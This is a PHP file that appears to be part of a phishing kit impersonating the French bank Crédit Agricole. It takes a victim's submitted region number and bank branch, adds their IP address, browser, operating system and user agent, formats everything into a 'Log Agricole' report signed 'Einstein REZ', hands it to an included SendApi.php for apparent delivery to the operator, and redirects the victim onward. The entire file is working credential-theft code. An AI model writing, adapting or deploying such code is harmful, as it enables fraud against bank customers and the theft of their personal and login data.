<?php
error_reporting(0);
session_start();

include("../detect.php"); 
$useragent = $_SERVER['HTTP_USER_AGENT'];
$brow = getBrowser() ;
$sys = getOs();
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

$InfoDATE   = date("d-m-Y h:i:sa");
	

$region_number = $_SESSION['region_number'] = $_POST['region_number'];
$reisse = $_SESSION['reisse'] = $_POST['reisse'];


$yagmai .= '
[📪 Saisissez ] = '.$_SESSION['region_number'].'
[📮 region caisse  ] = '.$_SESSION['reisse'].'
    [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🔍 FINGERPRINT] = '.$useragent.'

';


$yagmail .= '
[+]━━━━━━━━━━━━━━【 Log Agricole 】━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━━━【🆔Login】━━━━━━━━━━━━━━━━━━━━[+]
[📪 Saisissez ] = '.$_SESSION['region_number'].'
[📮 region caisse   ] = '.$_SESSION['reisse'].'
[+]=━━━━━━━━━━━━━━━━━━【💻 System】━━━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🔍 FINGERPRINT] = '.$useragent.'
[+]━━━━━━━━━━━━━━【 End Log 】━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━【Einstein REZ🤡🖕】━━━━━━━━━━━━━━━[+]
';
 
include("SendApi.php"); 


$src="../connect.php";
header("location:$src");

?>